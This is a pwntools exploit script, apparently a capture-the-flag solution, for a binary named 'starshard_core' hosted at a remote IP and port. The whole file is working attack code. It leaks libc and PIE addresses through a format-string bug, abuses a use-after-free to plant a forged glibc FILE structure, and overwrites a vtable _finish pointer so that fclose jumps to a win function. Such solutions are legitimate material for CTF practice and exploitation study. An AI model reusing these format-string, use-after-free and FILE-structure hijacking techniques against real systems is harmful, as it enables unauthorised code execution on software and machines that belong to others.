#!/usr/bin/env python3

from pwn import *

exe = ELF("./starshard_core_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.34.so")

context.binary = exe

gs = '''
b main'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gs)
    else:
        r = remote("154.57.164.65", 31730)

    return r

def chunk_writes(addr: int, data: bytes) -> list[tuple[int, bytes]]:
    # Split into NUL-free chunks so fputs won't stop early.
    out = []
    i = 0
    while i < len(data):
        if data[i] == 0:
            i += 1
            continue
        j = i
        while j < len(data) and data[j] != 0:
            j += 1
        out.append((addr + i, data[i:j]))
        i = j
    return out

def build_fake_file(target: int, write_len: int) -> bytes:
    buf = bytearray(0x48)
    buf[0x00:0x04] = p32(0xFBAD3484)  # writable flags
    buf[0x20:0x28] = p64(target)      # _IO_write_base
    buf[0x28:0x30] = p64(target)      # _IO_write_ptr
    buf[0x30:0x38] = p64(target + write_len)  # _IO_write_end
    buf[0x38:0x40] = p64(target)      # _IO_buf_base
    buf[0x40:0x48] = p64(target + write_len)  # _IO_buf_end
    return bytes(buf)


def main():
    r = conn()

    # good luck pwning :)
    r.sendlineafter(b'Name: ', b'%9$p:%10$p:')
    r.recvuntil(b'=== Welcome ')
    leak = r.recvline().split(b':')
    libc_leak = int(leak[0], 16)
    log.info(f'libc leak: {hex(libc_leak)}')
    pie_leak = int(leak[1], 16)
    log.info(f'pie leak: {hex(pie_leak)}')
    libc.address = libc_leak - 0x2dfd0
    log.info(f'libc base: {hex(libc.address)}')
    exe.address = pie_leak - 0x40
    log.info(f'pie base: {hex(exe.address)}')
    win = exe.address + 0x1726
    log.info(f'win addr: {hex(win)}')
    # ===========exploit===========
    finish_ptr = libc.address + 0x21a570
    log.info(f'_finish ptr: {hex(finish_ptr)}')

    # UAF
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b'Enter Starshard Routine Name: ', b'A'*4 + b'\n')
    r.sendlineafter(b'> ', b'3')

    # overwrite freed FILE with partial fake FILE
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Wish-Script Fragment Size: ', b'464')
    fake_file = build_fake_file(finish_ptr, 8)
    r.sendafter(b'Input Wish-Script Fragment:\n', fake_file + b'\n')

    # put win into spell_fragment
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Wish-Script Fragment Size: ', b'8')
    r.sendafter(b'Input Wish-Script Fragment:\n', p64(win) )

    # fputs → overwrite vtable->_finish
    r.sendlineafter(b'> ', b'4')

    # fclose → call win
    r.sendlineafter(b'> ', b'3')


    r.interactive()


if __name__ == "__main__":
    main()
